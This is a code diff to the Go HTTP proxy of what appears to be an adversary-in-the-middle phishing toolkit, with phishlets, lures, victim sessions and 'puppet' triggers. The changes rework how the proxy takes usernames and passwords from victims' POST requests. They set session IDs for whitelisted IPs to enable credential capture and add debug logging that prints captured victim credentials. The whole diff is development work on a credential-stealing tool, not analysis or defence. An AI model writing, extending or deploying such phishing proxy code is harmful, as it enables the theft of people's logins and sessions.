@@ -223,52 +223,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
 
-			if pl != nil && pl.puppet != nil {
-				for _, trigger := range pl.puppet.Triggers {
-					pathMatched := false
-					for _, tp := range trigger.Paths {
-						if strings.HasPrefix(req.URL.Path, tp) {
-							pathMatched = true
-							break
-						}
-					}
-
-					domainMatched := false
-					for _, td := range trigger.Domains {
-						if req.Host == td {
-							domainMatched = true
-							break
-						}
-					}
-
-					if pathMatched && domainMatched {
-						log.Info("[PUPPET] Intercepting request: %s", req.URL.Path)
-
-						creds := make(map[string]string)
-						if req.Method == "POST" {
-							body, err := ioutil.ReadAll(req.Body)
-							if err == nil {
-								req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
-								if pl.username.search != nil {
-									m := pl.username.search.FindStringSubmatch(string(body))
-									if len(m) > 1 {
-										creds["username"] = m[1]
-									}
-								}
-								if pl.password.search != nil {
-									m := pl.password.search.FindStringSubmatch(string(body))
-									if len(m) > 1 {
-										creds["password"] = m[1]
-									}
-								}
-							}
-						}
-
-						// This looks like older failed merge or something from my previous view? 
-						// I will remove this block as it is not correct and conflicts with the new logic I want to add globally.
-					}
-				}
-			}
+			// Redundant early puppet check removed to prevent body consumption issues.
+			// Puppet logic is now correctly handled after session identification.
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
@@ -376,19 +332,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					} else {
 						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
 							// not a lure path and IP is whitelisted
-
-							// TODO: allow only retrieval of static content, without setting session ID
-
 							create_session = false
 							req_ok = true
-							/*
-								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
-								if ok {
-									create_session = false
-									ps.Index, ok = p.sids[ps.SessionId]
-								} else {
-									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-								}*/
+							
+							// Ensure ps.SessionId is set even for whitelisted IPs without cookies
+							// to allow credential capture and puppet triggering
+							ps.SessionId = fmt.Sprintf("%s_%s", remote_addr, req.UserAgent())
+							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
+							log.Debug("[PROXY] Whitelisted IP session identified: %s", ps.SessionId)
 						}
 					}
 
@@ -721,15 +672,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
 						req.ContentLength = int64(len(body))
 
-						log.Debug("POST: %s", req.URL.Path)
-						log.Debug("POST body = %s", body)
-
 						contentType := req.Header.Get("Content-type")
+						sid := ps.SessionId
+						pl_name := "none"
+						if pl != nil {
+							pl_name = pl.Name
+						}
+						log.Debug("[PROXY] POST Request: path=%s, session=%s, phishlet=%s, content-type=%s", req.URL.Path, sid, pl_name, contentType)
 
-						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
-						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")
+						is_json := strings.Contains(contentType, "application/json") || strings.HasSuffix(contentType, "+json")
+						is_form := strings.Contains(contentType, "application/x-www-form-urlencoded")
 
-						if json_re.MatchString(contentType) {
+						if is_json {
 
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
@@ -811,7 +765,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
-						} else if form_re.MatchString(contentType) {
+						} else if is_form {
+							log.Debug("[PROXY] Identified form-urlencoded POST request to %s", req.URL.Path)
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
 								log.Debug("POST: %s", req.URL.Path)
@@ -2142,6 +2097,7 @@ func (p *HttpProxy) triggerPuppet(victimSession string, phishletName string, req
 
 	// get triggers for this phishlet
 	triggers := p.cfg.GetPuppetTriggersForPhishlet(phishletName)
+	log.Debug("[PUPPET] triggerPuppet called for phishlet: %s, session: %s, triggers found: %d", phishletName, victimSession, len(triggers))
 	if len(triggers) == 0 {
 		return
 	}
@@ -2165,6 +2121,8 @@ func (p *HttpProxy) triggerPuppet(victimSession string, phishletName string, req
 			creds[k] = v
 		}
 	}
+	
+	log.Debug("[PUPPET] Available credentials for session %s: %v", victimSession, creds)
 
 	// check each trigger
 	pm := GetPuppetMaster()
